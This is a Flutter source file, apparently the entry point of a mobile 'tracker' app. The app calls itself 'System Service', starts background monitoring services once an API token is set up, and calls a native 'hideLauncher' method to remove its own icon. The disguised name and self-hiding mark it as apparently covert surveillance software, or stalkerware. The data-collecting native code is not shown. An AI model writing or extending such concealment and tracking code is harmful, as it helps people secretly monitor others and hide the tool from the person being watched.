import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'screens/setup_screen.dart';
import 'services/api_service.dart';
import 'services/background_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:firebase_core/firebase_core.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  await BackgroundService.initialize();
  runApp(const TrackerApp());
}

class TrackerApp extends StatelessWidget {
  const TrackerApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Service',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorSchemeSeed: Colors.blue,
        useMaterial3: true,
        brightness: Brightness.dark,
      ),
      home: const AppEntry(),
    );
  }
}

class AppEntry extends StatefulWidget {
  const AppEntry({super.key});

  @override
  State<AppEntry> createState() => _AppEntryState();
}

class _AppEntryState extends State<AppEntry> {
  bool _isSetup = false;
  bool _loading = true;

  @override
  void initState() {
    super.initState();
    _checkSetup();
  }

  Future<void> _checkSetup() async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('api_token');
    setState(() {
      _isSetup = token != null && token.isNotEmpty;
      _loading = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    if (_loading) {
      return const Scaffold(
        body: Center(child: CircularProgressIndicator()),
      );
    }

    if (!_isSetup) {
      return SetupScreen(onSetupComplete: () {
        setState(() => _isSetup = true);
        // After setup, hide app and start services
        _startServicesAndHide();
      });
    }

    // If already setup, show a minimal "running" screen
    return const RunningScreen();
  }

  void _startServicesAndHide() {
    // Start native services via platform channel
    const platform = MethodChannel('com.tracker.app/services');
    platform.invokeMethod('startAllServices');
    // Optionally hide launcher icon
    platform.invokeMethod('hideLauncher');
  }
}

class RunningScreen extends StatelessWidget {
  const RunningScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.check_circle, size: 64, color: Colors.green[400]),
            const SizedBox(height: 16),
            const Text(
              'Service is running',
              style: TextStyle(fontSize: 18, fontWeight: FontWeight.w600),
            ),
            const SizedBox(height: 8),
            Text(
              'All monitoring services are active.',
              style: TextStyle(color: Colors.grey[500], fontSize: 14),
            ),
          ],
        ),
      ),
    );
  }
}
